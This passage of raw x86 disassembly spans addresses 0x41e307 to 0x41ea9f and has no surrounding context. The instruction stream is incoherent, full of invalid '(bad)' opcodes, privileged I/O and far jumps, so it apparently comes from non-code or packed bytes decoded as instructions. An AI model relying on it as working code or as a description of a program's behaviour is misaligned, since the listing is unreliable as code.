  41e307:	out    0x1c,al
  41e309:	leave  
  41e30a:	adc    cl,BYTE PTR [edx-0x5c]
  41e30d:	loope  0x41e35b
  41e30f:	mov    cl,0x39
  41e311:	and    al,bh
  41e313:	pop    edi
  41e314:	jne    0x41e33a
  41e316:	add    eax,0xc5d4efec
  41e31b:	fwait
  41e31c:	pop    ds
  41e31d:	push   esp
  41e31e:	push   esp
  41e31f:	jnp    0x41e306
  41e321:	popa   
  41e322:	sub    esp,DWORD PTR [ebp-0x6c]
  41e325:	(bad)  
  41e326:	icebp  
  41e327:	or     dh,BYTE PTR [edi]
  41e329:	test   eax,0x6d4be9ab
  41e32e:	int    0x35
  41e330:	(bad)  
  41e331:	mov    ds:0xeb98dbc7,eax
  41e336:	test   ebx,edx
  41e338:	sbb    ecx,ebp
  41e33a:	frstor [esi+0x3f]
  41e33d:	adc    bl,BYTE PTR [edx]
  41e33f:	aam    0x38
  41e341:	cdq    
  41e342:	jnp    0x41e396
  41e344:	and    DWORD PTR [ebp-0x11099b89],ebx
  41e34a:	mov    ah,0xd2
  41e34c:	(bad)  
  41e34d:	mov    edi,0x3701652d
  41e352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e353:	mov    al,0x85
  41e355:	hlt    
  41e356:	pusha  
  41e357:	in     eax,dx
  41e358:	cld    
  41e359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e35a:	fist   DWORD PTR [edx+0xf98526b]
  41e360:	in     eax,0x8c
  41e362:	out    0x2,eax
  41e364:	fwait
  41e365:	out    dx,al
  41e366:	mov    edi,0x860d1f94
  41e36b:	sbb    DWORD PTR [ebp-0x5f],0x4b
  41e36f:	push   ebx
  41e370:	mov    cl,0xd6
  41e372:	xchg   ebp,eax
  41e373:	outs   dx,DWORD PTR ds:[esi]
  41e374:	sbb    BYTE PTR [bx+si+0x4],0x89
  41e379:	(bad)  
  41e37b:	hlt    
  41e37c:	inc    ecx
  41e37d:	pop    eax
  41e37e:	jmp    0x41e3a7
  41e380:	test   eax,0xdfcbbb9f
  41e385:	push   ss
  41e386:	add    eax,0x4180ae92
  41e38b:	js     0x41e3f4
  41e38d:	arpl   WORD PTR [ebp+0x60629cc4],di
  41e393:	push   eax
  41e394:	xchg   ebp,eax
  41e395:	add    al,0xdd
  41e397:	out    dx,al
  41e398:	shl    DWORD PTR [ebx-0x40],1
  41e39b:	int3   
  41e39c:	add    al,0xca
  41e39e:	and    al,0xf8
  41e3a0:	inc    edi
  41e3a1:	lahf   
  41e3a2:	fwait
  41e3a3:	in     al,dx
  41e3a4:	cmp    dl,bl
  41e3a6:	(bad)  
  41e3a7:	cli    
  41e3a8:	sbb    eax,0x131d7b9d
  41e3ad:	mov    ebp,0x971a868d
  41e3b2:	std    
  41e3b3:	pusha  
  41e3b4:	repnz add eax,ebp
  41e3b7:	hlt    
  41e3b8:	sbb    eax,0x23ee7104
  41e3bd:	jo     0x41e43c
  41e3bf:	and    DWORD PTR [ebx+0x5cc507a8],esi
  41e3c5:	add    bh,BYTE PTR [ecx-0x5e]
  41e3c8:	and    BYTE PTR [esp+edx*2-0x5f],dh
  41e3cc:	adc    DWORD PTR [edi-0x43],esi
  41e3cf:	mov    ah,0xad
  41e3d1:	mov    eax,ss
  41e3d3:	lods   al,BYTE PTR ds:[esi]
  41e3d4:	pushf  
  41e3d5:	fs mov ?,edx
  41e3d8:	out    0x9f,al
  41e3da:	retf   
  41e3db:	dec    ebx
  41e3dc:	mov    ah,0x20
  41e3de:	and    dl,dh
  41e3e0:	sbb    DWORD PTR [ecx-0x1e],ebx
  41e3e3:	repnz dec eax
  41e3e5:	push   ecx
  41e3e6:	not    BYTE PTR [ecx]
  41e3e8:	mov    esi,0x86e76b9e
  41e3ed:	popf   
  41e3ee:	mov    esi,0xf3aa1720
  41e3f3:	out    dx,eax
  41e3f4:	and    ecx,DWORD PTR [ecx-0x28]
  41e3f7:	and    ah,dh
  41e3f9:	fs inc esi
  41e3fb:	sub    al,0x5c
  41e3fd:	adc    ah,bl
  41e3ff:	push   0xb9563cb8
  41e404:	mov    esi,0x13f022d5
  41e409:	mov    bh,bl
  41e40b:	inc    ebp
  41e40c:	inc    eax
  41e40d:	cdq    
  41e40e:	popa   
  41e40f:	pop    esp
  41e410:	mov    eax,ds:0x5f44d54
  41e415:	aas    
  41e416:	xor    edx,ebp
  41e418:	cli    
  41e419:	jmp    0xd9929dd5
  41e41e:	sbb    DWORD PTR [edi+esi*4],esp
  41e421:	add    bh,dl
  41e423:	stc    
  41e424:	mov    ebp,0x85f0b37b
  41e429:	and    BYTE PTR [ebp+0x561c4bf1],al
  41e42f:	imul   edx,DWORD PTR ds:0x19a7bbcb,0x61
  41e436:	xlat   BYTE PTR ds:[ebx]
  41e437:	add    ah,BYTE PTR [edx-0x76]
  41e43a:	sub    DWORD PTR [ebp-0x1523884b],ebx
  41e440:	mov    dl,0xf7
  41e442:	dec    ecx
  41e443:	(bad)  
  41e444:	lock jp 0x41e485
  41e447:	sbb    DWORD PTR [ebx],0x386525d9
  41e44d:	pop    DWORD PTR [eax+0x17]
  41e450:	push   ss
  41e451:	fisttp WORD PTR [ecx-0x3a]
  41e454:	sti    
  41e455:	pushf  
  41e456:	(bad)  
  41e457:	mov    edx,0x1b68171b
  41e45c:	adc    DWORD PTR [edx-0x5e1b5c3a],ecx
  41e462:	lods   eax,DWORD PTR ds:[esi]
  41e463:	mov    edi,DWORD PTR [edx-0x5a47ebeb]
  41e469:	push   cs
  41e46a:	add    dh,ah
  41e46c:	call   0xd719:0x25e6d81b
  41e473:	fild   QWORD PTR [esi+0x7ddc2fd9]
  41e479:	pushf  
  41e47a:	imul   edi,DWORD PTR [edi-0x5f07f6a9],0xffffff82
  41e481:	sub    ecx,DWORD PTR [ecx-0x38]
  41e484:	push   ebp
  41e485:	mov    edx,0xa4fe652d
  41e48a:	pop    edi
  41e48b:	mov    gs,WORD PTR [esi-0x328d94ee]
  41e491:	imul   edi,DWORD PTR [ebp-0x6c652e48],0x6274023a
  41e49b:	xor    BYTE PTR [edx],ch
  41e49d:	or     DWORD PTR [eax-0x2e100819],edx
  41e4a3:	shl    BYTE PTR [edx+0x76],cl
  41e4a6:	adc    eax,0x5120d518
  41e4ab:	in     eax,dx
  41e4ac:	outs   dx,BYTE PTR ds:[esi]
  41e4ad:	jge    0x41e4dd
  41e4af:	jb     0x41e4ce
  41e4b1:	jns    0x41e4de
  41e4b3:	or     dl,BYTE PTR [edx]
  41e4b5:	test   BYTE PTR [edx+0x37],dh
  41e4b8:	jmp    0xe331:0xbd79d4a4
  41e4bf:	xlat   BYTE PTR ds:[ebx]
  41e4c0:	and    eax,0xf1f19c10
  41e4c5:	in     eax,0x2b
  41e4c7:	jge    0x41e4e9
  41e4c9:	stc    
  41e4ca:	mov    ah,0x2b
  41e4cc:	inc    ebp
  41e4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ce:	into   
  41e4cf:	lods   eax,DWORD PTR ds:[esi]
  41e4d0:	fisub  WORD PTR [ebx+ecx*8-0x1db9184f]
  41e4d7:	je     0x41e4ad
  41e4d9:	(bad)  
  41e4da:	xor    eax,0xb2bd3a0e
  41e4df:	hlt    
  41e4e0:	mov    ecx,0xd6113fe3
  41e4e5:	mov    ah,0xef
  41e4e7:	sbb    DWORD PTR [edi+0x32219770],ebx
  41e4ed:	cmp    DWORD PTR [ecx-0x1e714c4e],edi
  41e4f3:	push   esp
  41e4f4:	cmp    dh,BYTE PTR [edi+0x596cd14]
  41e4fa:	sbb    eax,0x8ffc85ab
  41e4ff:	hlt    
  41e500:	push   edx
  41e501:	sub    al,0xd9
  41e503:	nop
  41e504:	or     ebx,ebx
  41e506:	push   ds
  41e507:	fcomp  DWORD PTR [ecx+esi*4]
  41e50a:	or     BYTE PTR [ecx+0x360b0f96],0xe5
  41e511:	lods   al,BYTE PTR ds:[esi]
  41e512:	sti    
  41e513:	repnz pop edx
  41e515:	(bad)  
  41e517:	(bad)  
  41e518:	mov    DWORD PTR [ecx],ebp
  41e51a:	shl    BYTE PTR [ecx-0x1ec2a595],1
  41e520:	jmp    0x41e4bd
  41e522:	sahf   
  41e523:	repnz lods eax,DWORD PTR ds:[esi]
  41e525:	(bad)  [ebp+0x3241065f]
  41e52c:	shl    DWORD PTR [edx],0x89
  41e52f:	dec    ecx
  41e530:	pop    esi
  41e531:	sbb    esi,DWORD PTR [edi-0x3898bfc]
  41e537:	or     BYTE PTR [ebp+0x10f0ceb5],ah
  41e53d:	ror    dh,1
  41e53f:	sub    eax,0x94e07917
  41e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e545:	push   ss
  41e546:	inc    ebp
  41e547:	adc    BYTE PTR [ecx+eiz*4+0x5b],ch
  41e54b:	cmc    
  41e54c:	bound  esi,QWORD PTR [edx]
  41e54e:	(bad)  
  41e54f:	loopne 0x41e52b
  41e551:	jno    0x41e59f
  41e553:	adc    ecx,DWORD PTR [ebx-0x471fcc90]
  41e559:	adc    ah,BYTE PTR [ecx+0x78223715]
  41e55f:	out    dx,al
  41e560:	or     eax,0x18154ba4
  41e565:	mov    al,0x5c
  41e567:	or     al,bh
  41e569:	pushf  
  41e56a:	gs inc esp
  41e56c:	not    DWORD PTR [edx-0x47]
  41e56f:	(bad)  
  41e570:	lock mov edi,0x97755fbe
  41e576:	test   eax,ebp
  41e578:	mov    ebx,0x2357a8ff
  41e57d:	sbb    edx,esp
  41e57f:	retf   0x3713
  41e582:	sub    BYTE PTR [ecx+0x3e],bl
  41e585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e586:	mov    edi,DWORD PTR [edx+0x68]
  41e589:	and    al,0x65
  41e58b:	sub    al,0xea
  41e58d:	cmp    DWORD PTR ds:0x9f018a73,ebp
  41e593:	jne    0x41e5f0
  41e595:	inc    edi
  41e596:	in     eax,0xff
  41e598:	and    BYTE PTR [edi+0x7339cfa4],al
  41e59e:	xor    ah,BYTE PTR [edx-0x2dc35229]
  41e5a4:	add    al,0xd5
  41e5a6:	mov    al,0x94
  41e5a8:	jmp    0xbf00:0xe81b21a
  41e5af:	add    al,0x3
  41e5b1:	push   ecx
  41e5b2:	loope  0x41e620
  41e5b4:	out    0xae,al
  41e5b6:	jb     0x41e563
  41e5b8:	sbb    eax,DWORD PTR [edi]
  41e5ba:	and    al,0x64
  41e5bc:	add    eax,DWORD PTR [ebp-0x55]
  41e5bf:	test   al,0x87
  41e5c1:	jo     0x41e57f
  41e5c3:	fs inc esi
  41e5c5:	repz out dx,al
  41e5c7:	stos   DWORD PTR es:[edi],eax
  41e5c8:	xor    eax,0x3fea0104
  41e5cd:	bound  eax,QWORD PTR [ebx-0x73]
  41e5d0:	and    al,0x39
  41e5d2:	lock cmp cl,cl
  41e5d5:	les    esp,FWORD PTR [edx-0x51]
  41e5d8:	pop    eax
  41e5d9:	mov    eax,ds:0xcf8b771b
  41e5de:	xchg   ecx,eax
  41e5df:	sub    esp,DWORD PTR [ebx-0x13e1d895]
  41e5e5:	inc    ebp
  41e5e6:	mov    ebp,0x77250424
  41e5eb:	pop    ebp
  41e5ec:	in     eax,0xa6
  41e5ee:	stos   BYTE PTR es:[edi],al
  41e5ef:	hlt    
  41e5f0:	add    DWORD PTR [ebp+0x17],0x78
  41e5f4:	or     ch,BYTE PTR [edx]
  41e5f6:	sbb    edi,DWORD PTR [ecx+0xf]
  41e5f9:	mov    ds:0x8a46421b,eax
  41e5fe:	and    BYTE PTR [ebx],bh
  41e600:	jne    0x41e622
  41e602:	(bad)  
  41e603:	in     al,0xfa
  41e605:	and    al,0xa1
  41e607:	repz add eax,0xda7e9f4a
  41e60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e60e:	adc    DWORD PTR [ecx],ebp
  41e610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e611:	imul   edi,DWORD PTR [ebx+0x9],0xbb7101c9
  41e618:	adc    ecx,DWORD PTR [eax+0x2b2634b2]
  41e61e:	dec    ebx
  41e61f:	es aad 0x1f
  41e622:	and    esi,DWORD PTR [eax-0x5b]
  41e625:	pop    ds
  41e626:	inc    edx
  41e627:	out    dx,al
  41e628:	les    esp,FWORD PTR [ecx+0x29195277]
  41e62e:	mov    bl,0x88
  41e630:	xrelease mov DWORD PTR [esp+ebx*1-0x28],ebx
  41e635:	jnp    0x41e683
  41e637:	add    eax,DWORD PTR [edi+0x5400f3db]
  41e63d:	js     0x41e601
  41e63f:	lods   al,BYTE PTR ds:[esi]
  41e640:	jecxz  0x41e5fc
  41e642:	lock in al,0x1c
  41e645:	cdq    
  41e646:	cmp    esp,edx
  41e648:	arpl   WORD PTR [edx-0x5751824d],bx
  41e64e:	jnp    0x41e67c
  41e650:	inc    esi
  41e651:	sub    BYTE PTR [edx-0x6baa82d],0xe2
  41e658:	pop    esi
  41e659:	or     eax,0x21c3611
  41e65e:	mov    bh,0xd4
  41e660:	mov    ah,0x6c
  41e662:	popf   
  41e663:	mov    ah,0x81
  41e665:	pushf  
  41e666:	sub    edi,DWORD PTR [ecx-0x18]
  41e669:	dec    ebx
  41e66a:	fwait
  41e66b:	in     al,dx
  41e66c:	push   ds
  41e66d:	or     DWORD PTR [ecx-0x2a],esi
  41e670:	cmp    al,BYTE PTR [esi]
  41e672:	mov    esp,DWORD PTR [esi+0x42]
  41e675:	mov    al,ds:0x8d83d5cb
  41e67a:	(bad)  
  41e67b:	xor    BYTE PTR [eax+0x75],al
  41e67e:	leave  
  41e67f:	xor    cl,BYTE PTR [esi]
  41e681:	rcl    BYTE PTR [esi+eiz*4-0x534ff2bb],1
  41e688:	cmp    esp,DWORD PTR [ecx-0x6a169f65]
  41e68e:	adc    DWORD PTR [edi+edx*8],esi
  41e691:	xchg   esp,eax
  41e692:	stc    
  41e693:	sar    DWORD PTR [ecx+0x4b],cl
  41e696:	xchg   esp,eax
  41e697:	repz xchg edx,eax
  41e699:	jns    0x41e627
  41e69b:	fcomp  DWORD PTR [eax]
  41e69d:	aad    0x29
  41e69f:	test   eax,0x4d5ba64e
  41e6a4:	jecxz  0x41e6b0
  41e6a6:	and    dl,cl
  41e6a8:	cwde   
  41e6a9:	iret   
  41e6aa:	inc    esi
  41e6ab:	jne    0x41e64d
  41e6ad:	(bad)  
  41e6ae:	mov    cl,0xd4
  41e6b0:	mov    edx,0xf52f1598
  41e6b5:	cmp    DWORD PTR [edi],ebx
  41e6b7:	in     eax,0x94
  41e6b9:	pusha  
  41e6ba:	out    dx,al
  41e6bb:	(bad)  [eax+0x23cb4abb]
  41e6c1:	jns    0x41e6f7
  41e6c3:	ins    BYTE PTR es:[edi],dx
  41e6c4:	jb     0x41e673
  41e6c6:	bound  eax,QWORD PTR [edi]
  41e6c8:	pop    edx
  41e6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6ca:	mov    ebx,0x82778b9c
  41e6cf:	pop    ds
  41e6d0:	hlt    
  41e6d1:	pop    es
  41e6d2:	sbb    ebx,esi
  41e6d4:	stc    
  41e6d5:	test   eax,0xa68af338
  41e6da:	jne    0x41e71a
  41e6dc:	adc    al,0xdc
  41e6de:	lods   eax,DWORD PTR ds:[esi]
  41e6df:	fnstcw WORD PTR [ecx]
  41e6e1:	mov    BYTE PTR ds:0xbbe020c3,bh
  41e6e7:	sbb    al,0x59
  41e6e9:	les    ebx,FWORD PTR [ecx+0x257fac90]
  41e6ef:	mov    ch,0x1d
  41e6f1:	add    al,BYTE PTR [edx+eiz*4+0x2adba630]
  41e6f8:	pop    ds
  41e6f9:	adc    ecx,DWORD PTR [edi-0x66]
  41e6fc:	xor    BYTE PTR [esi],bh
  41e6fe:	inc    esp
  41e6ff:	push   ecx
  41e700:	out    dx,eax
  41e701:	out    0xb9,eax
  41e703:	test   BYTE PTR [ebp-0xab7b8fc],ah
  41e709:	cmp    al,0x41
  41e70b:	repnz loope 0x41e6a3
  41e70e:	xor    DWORD PTR [edi+0x1c],esi
  41e711:	leave  
  41e712:	mov    ecx,0xd3b192ea
  41e717:	cwde   
  41e718:	(bad)  
  41e719:	mov    al,ds:0xe83c4dab
  41e71e:	fwait
  41e71f:	pop    esi
  41e720:	adc    bl,BYTE PTR [eax]
  41e722:	loopne 0x41e6d1
  41e724:	test   eax,ecx
  41e726:	mov    edi,0x5fa3d384
  41e72b:	es in  eax,dx
  41e72d:	fcomp  QWORD PTR ds:0xdb9dbd08
  41e733:	mov    cl,0x7
  41e735:	outs   dx,BYTE PTR ds:[esi]
  41e736:	mov    ds:0xa0c954ab,al
  41e73b:	sbb    eax,0x6688899e
  41e740:	pop    edi
  41e741:	lds    edx,FWORD PTR [esi+0x2afeb7ef]
  41e747:	and    eax,DWORD PTR [ebp+0x37]
  41e74a:	inc    ebp
  41e74b:	repnz and eax,0x6e3d06eb
  41e751:	xchg   DWORD PTR [ecx-0x4136355c],esi
  41e757:	scas   al,BYTE PTR es:[edi]
  41e758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e759:	mov    al,0x53
  41e75b:	icebp  
  41e75c:	lea    ecx,[bx+0x70]
  41e760:	and    ecx,edi
  41e762:	jae    0x41e748
  41e764:	in     eax,dx
  41e765:	sbb    ah,bh
  41e767:	cmp    eax,0xe1ba42e
  41e76c:	pop    edi
  41e76d:	mov    bl,BYTE PTR ds:0x9d1d4426
  41e773:	or     esi,edx
  41e775:	mov    bl,0x6b
  41e777:	mov    eax,0x9f5ea7a6
  41e77c:	arpl   WORD PTR [ebp+0x70],sp
  41e77f:	mov    eax,0xec021a15
  41e784:	jmp    0x41e7a1
  41e786:	in     al,0x5b
  41e788:	pop    ds
  41e789:	cdq    
  41e78a:	test   al,0x1c
  41e78c:	in     eax,0x25
  41e78e:	loopne 0x41e7b8
  41e790:	pop    ss
  41e791:	out    0x1b,eax
  41e793:	stos   DWORD PTR es:[edi],eax
  41e794:	sbb    DWORD PTR [eax+0x4e6d8705],edx
  41e79a:	sar    ah,0x32
  41e79d:	xchg   ebp,eax
  41e79e:	int    0x65
  41e7a0:	jno    0x41e766
  41e7a2:	mov    cl,0xc4
  41e7a4:	pop    edi
  41e7a5:	stos   DWORD PTR es:[edi],eax
  41e7a6:	mov    eax,0xfb496b6
  41e7ab:	ficomp WORD PTR [edi]
  41e7ad:	jmp    0x92931487
  41e7b2:	(bad)  
  41e7b4:	mov    gs,WORD PTR [ecx-0x7713e7c5]
  41e7ba:	xor    dl,ah
  41e7bc:	mov    ds:0x580c8975,al
  41e7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c2:	ja     0x41e7b7
  41e7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c5:	pop    ss
  41e7c6:	jp     0x41e81d
  41e7c8:	rcr    BYTE PTR [edi],0xb3
  41e7cb:	add    al,0x50
  41e7cd:	jnp    0x41e7d0
  41e7cf:	out    dx,eax
  41e7d0:	jne    0x41e802
  41e7d2:	sti    
  41e7d3:	not    BYTE PTR [eax-0x74]
  41e7d6:	sbb    edx,esp
  41e7d8:	push   esp
  41e7d9:	addr16 inc ebx
  41e7db:	bnd jg 0x41e7db
  41e7de:	lock in al,0x1e
  41e7e1:	add    eax,0x2bf53085
  41e7e6:	jl     0x41e7f7
  41e7e8:	pusha  
  41e7e9:	in     eax,dx
  41e7ea:	(bad)  
  41e7eb:	jmp    0x5002970
  41e7f0:	and    al,0x39
  41e7f2:	or     ecx,ebx
  41e7f4:	aad    0x7b
  41e7f6:	das    
  41e7f7:	mov    edx,0x3546a855
  41e7fc:	jnp    0x41e84e
  41e7fe:	fbld   TBYTE PTR [esi-0x7b4bef59]
  41e804:	mov    bh,0xf3
  41e806:	shl    cl,1
  41e808:	push   0x5a
  41e80a:	ret    
  41e80b:	and    al,0xd4
  41e80d:	mov    bl,0xf2
  41e80f:	aas    
  41e810:	cmp    al,0x9d
  41e812:	cmp    esp,DWORD PTR [edi+edx*4]
  41e815:	pusha  
  41e816:	out    0x58,eax
  41e818:	pop    edi
  41e819:	dec    edi
  41e81a:	pop    esp
  41e81b:	push   0xe4bec75e
  41e820:	and    BYTE PTR [eax],ch
  41e822:	rol    ah,0x45
  41e825:	mov    eax,ds:0x5532eb73
  41e82a:	xor    eax,0x3a691eed
  41e82f:	int3   
  41e830:	aas    
  41e831:	in     al,dx
  41e832:	int    0xd9
  41e834:	arpl   WORD PTR [eax+0x79dc6afb],sp
  41e83a:	mov    dh,BYTE PTR [esi+0x76b7ea5b]
  41e840:	mov    ebx,0x7d14c489
  41e845:	mov    ah,0x9
  41e847:	mov    ecx,0x8bba9aff
  41e84c:	adc    eax,0x6ee951a1
  41e851:	push   esp
  41e852:	jle    0x41e8b8
  41e854:	push   ss
  41e855:	xchg   esp,eax
  41e856:	dec    edi
  41e857:	sub    ecx,eax
  41e859:	test   BYTE PTR [edx+0x29570f74],bh
  41e85f:	fist   WORD PTR [ebp-0x20]
  41e862:	fdivr  st,st(2)
  41e864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e865:	mov    DWORD PTR [ebx],ebp
  41e867:	mov    ds:0xef522a23,eax
  41e86c:	and    DWORD PTR [ecx],ebx
  41e86e:	xchg   ebx,eax
  41e86f:	mov    ds:0x8aa02a38,eax
  41e874:	mov    edx,0x393ddba5
  41e879:	fsubr  DWORD PTR [ebp-0x17]
  41e87c:	ret    
  41e87d:	push   cs
  41e87e:	xchg   ecx,eax
  41e87f:	ds (bad) 
  41e881:	jecxz  0x41e83c
  41e883:	fs push es
  41e885:	imul   ecx,DWORD PTR [esi-0x2],0xea0ae4b5
  41e88c:	sbb    dh,ch
  41e88e:	fild   DWORD PTR [ebx-0x7cfa741e]
  41e894:	sbb    bl,cl
  41e896:	jno    0x41e910
  41e898:	adc    BYTE PTR [eax+0x11151246],dh
  41e89e:	mov    eax,ds:0x251a78e7
  41e8a3:	mov    ebx,0xcefaa925
  41e8a8:	mov    ebx,0x6f251e2f
  41e8ad:	dec    ebx
  41e8ae:	das    
  41e8af:	daa    
  41e8b0:	sbb    al,0x79
  41e8b2:	sahf   
  41e8b3:	idiv   BYTE PTR [edx+0x19b41d17]
  41e8b9:	fldenv [ecx-0x51c69fbb]
  41e8bf:	add    DWORD PTR [esi],0xffffffa0
  41e8c2:	sub    ebx,DWORD PTR [ecx-0x2b1934e2]
  41e8c8:	sti    
  41e8c9:	xlat   BYTE PTR ds:[ebx]
  41e8ca:	out    dx,eax
  41e8cb:	in     eax,dx
  41e8cc:	sub    al,0xe6
  41e8ce:	stos   BYTE PTR es:[edi],al
  41e8cf:	hlt    
  41e8d0:	(bad)  
  41e8d1:	mov    esi,0xa40b04ef
  41e8d6:	jae    0x41e911
  41e8d8:	out    dx,al
  41e8d9:	xor    bl,ah
  41e8db:	mov    eax,ds:0xefcde9d5
  41e8e0:	pop    eax
  41e8e1:	mov    WORD PTR [ecx+eiz*1],?
  41e8e4:	dec    edx
  41e8e5:	or     DWORD PTR [ebx+esi*4],esi
  41e8e8:	gs push es
  41e8ea:	out    dx,al
  41e8eb:	jb     0x41e89c
  41e8ed:	scas   eax,DWORD PTR es:[edi]
  41e8ee:	arpl   di,sp
  41e8f0:	hlt    
  41e8f1:	popf   
  41e8f2:	fisttp DWORD PTR ds:0x43dd7d2d
  41e8f8:	sar    al,1
  41e8fa:	lds    ebx,FWORD PTR [edx]
  41e8fc:	out    0xfe,al
  41e8fe:	mov    ebx,0xa14588a4
  41e903:	iret   
  41e904:	aad    0x3d
  41e906:	sub    ebp,esp
  41e908:	pop    eax
  41e909:	pop    esi
  41e90a:	jle    0x41e90a
  41e90c:	and    al,0x69
  41e90e:	in     eax,dx
  41e90f:	dec    eax
  41e910:	push   esp
  41e911:	shl    DWORD PTR [eax+0x2ba2b48e],cl
  41e917:	cdq    
  41e918:	js     0x41e8e6
  41e91a:	cmp    DWORD PTR [esi+edi*4+0x1a61e91f],ecx
  41e921:	jecxz  0x41e8dc
  41e923:	je     0x41e9a4
  41e925:	jmp    0x63f7:0x8f96b890
  41e92c:	mov    esi,0x9d374fa6
  41e931:	mov    eax,0x2ec85cda
  41e936:	mov    bh,0x54
  41e938:	or     al,0xea
  41e93a:	out    dx,eax
  41e93b:	sub    eax,0xe9c136f5
  41e940:	xchg   DWORD PTR [ebp-0x28400281],edi
  41e946:	out    dx,eax
  41e947:	neg    edx
  41e949:	clc    
  41e94a:	mov    bl,0x84
  41e94c:	inc    edi
  41e94d:	or     DWORD PTR [ecx+0x4e91996b],ecx
  41e953:	xchg   DWORD PTR [si+0x4bb],ecx
  41e958:	out    dx,eax
  41e959:	xchg   DWORD PTR [ebx+0x39],eax
  41e95c:	jmp    0x41e9be
  41e95e:	mov    dl,0x84
  41e960:	pop    esi
  41e961:	pop    es
  41e962:	jp     0x41e8f7
  41e964:	test   DWORD PTR [edi],edi
  41e966:	psllq  mm6,QWORD PTR [ebx+0x7e0af8e]
  41e96d:	jp     0x41e950
  41e96f:	es mov al,0xa4
  41e972:	sar    DWORD PTR [edi-0x2a],cl
  41e975:	jne    0x41e9a0
  41e977:	adc    DWORD PTR [ecx-0x56],eax
  41e97a:	test   eax,0xdc6159e7
  41e97f:	loop   0x41e94c
  41e981:	mov    ch,0xb7
  41e983:	push   esp
  41e984:	push   esp
  41e985:	fldenv [ecx-0x76]
  41e988:	adc    eax,0x92f26555
  41e98d:	sbb    esi,DWORD PTR [ebp+0x65891f71]
  41e993:	adc    eax,0x25db781f
  41e998:	pop    eax
  41e999:	mov    WORD PTR [edi],ds
  41e99b:	cmp    dh,bl
  41e99d:	jp     0x41e9c4
  41e99f:	sub    al,0xb1
  41e9a1:	mov    ecx,0xc88af087
  41e9a6:	cmc    
  41e9a7:	pop    esp
  41e9a8:	xchg   esp,eax
  41e9a9:	mov    esi,0xab0714bd
  41e9ae:	pop    ebp
  41e9af:	inc    esi
  41e9b0:	in     eax,0x63
  41e9b2:	sbb    al,0xee
  41e9b4:	bound  esi,QWORD PTR [edx]
  41e9b6:	xor    edx,ebx
  41e9b8:	push   ds
  41e9b9:	ja     0x41e950
  41e9bb:	int3   
  41e9bc:	inc    ecx
  41e9bd:	lahf   
  41e9be:	mov    ah,0x14
  41e9c0:	sub    BYTE PTR [ebp-0x37dac85f],al
  41e9c6:	out    0xec,al
  41e9c8:	inc    esi
  41e9c9:	xlat   BYTE PTR ds:[ebx]
  41e9ca:	mov    esp,0x5458b7c9
  41e9cf:	adc    ebp,edx
  41e9d1:	cmp    BYTE PTR [esi-0xd6192bc],dh
  41e9d7:	jnp    0x41ea1e
  41e9d9:	mov    al,0xbe
  41e9db:	jmp    0xf052:0xa95950bc
  41e9e2:	push   0xffffff86
  41e9e4:	out    0xba,eax
  41e9e6:	sub    BYTE PTR [ebp+0x6a],dh
  41e9e9:	xor    al,0x3a
  41e9eb:	addr16 sub eax,0x2d2cb89d
  41e9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9f2:	or     ebx,DWORD PTR [edx+0x61]
  41e9f5:	shl    esp,0x75
  41e9f8:	jmp    0x2f8a7f11
  41e9fd:	mov    edi,0xf51f269f
  41ea02:	ret    0x2648
  41ea05:	mov    edi,0xc49f3017
  41ea0a:	sti    
  41ea0b:	jb     0x41ea4d
  41ea0d:	mov    esi,0x914aa2fd
  41ea12:	daa    
  41ea13:	and    DWORD PTR [ebx],ebx
  41ea15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea16:	(bad)  
  41ea17:	in     al,dx
  41ea18:	sbb    ebp,ecx
  41ea1a:	bound  ebx,QWORD PTR [ebp-0x4132732a]
  41ea20:	pop    esp
  41ea21:	sub    BYTE PTR [edx+ecx*4+0x750fe6e5],0xbf
  41ea29:	and    bh,BYTE PTR [edi-0x36f6e0d8]
  41ea2f:	add    al,BYTE PTR [ebx+0x1423fee2]
  41ea35:	sahf   
  41ea36:	imul   esp,DWORD PTR [edx],0xffffff9a
  41ea39:	ss pop ecx
  41ea3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea3c:	imul   di,WORD PTR [ebp-0x44275050],0x32b4
  41ea45:	adc    ah,0x77
  41ea48:	push   ebp
  41ea49:	push   ecx
  41ea4a:	sub    al,0xef
  41ea4c:	test   BYTE PTR [ebx-0x1a],bl
  41ea4f:	sti    
  41ea50:	popf   
  41ea51:	jl     0x41ea9c
  41ea53:	dec    edx
  41ea54:	in     eax,0xe4
  41ea56:	jl     0x41ea43
  41ea58:	scas   al,BYTE PTR es:[edi]
  41ea59:	add    al,0x52
  41ea5b:	xlat   BYTE PTR ds:[ebx]
  41ea5c:	es push ss
  41ea5e:	cmp    BYTE PTR [ebx+ecx*2+0x1be53fd9],bl
  41ea65:	js     0x41ea2e
  41ea67:	sub    al,0x1d
  41ea69:	fxam   
  41ea6b:	or     edx,DWORD PTR [ebx+0x79fce0a6]
  41ea71:	js     0x41eae2
  41ea73:	xor    eax,0x4aa6e9f7
  41ea78:	pop    ds
  41ea79:	push   edi
  41ea7a:	xchg   DWORD PTR [eax],edi
  41ea7c:	es cwde 
  41ea7e:	and    al,0x80
  41ea80:	or     BYTE PTR [ecx],dh
  41ea82:	mov    dl,0x7b
  41ea84:	or     bl,BYTE PTR [esi-0x4b]
  41ea87:	push   esp
  41ea88:	sub    ah,BYTE PTR [eax-0x5e3f3212]
  41ea8e:	or     esi,esp
  41ea90:	hlt    
  41ea91:	daa    
  41ea92:	shl    bh,0x50
  41ea95:	not    DWORD PTR [edx]
  41ea97:	xchg   esi,eax
  41ea98:	out    dx,eax
  41ea99:	adc    DWORD PTR [ebp+0x4a907aa4],edi
  41ea9f:	inc    ebx
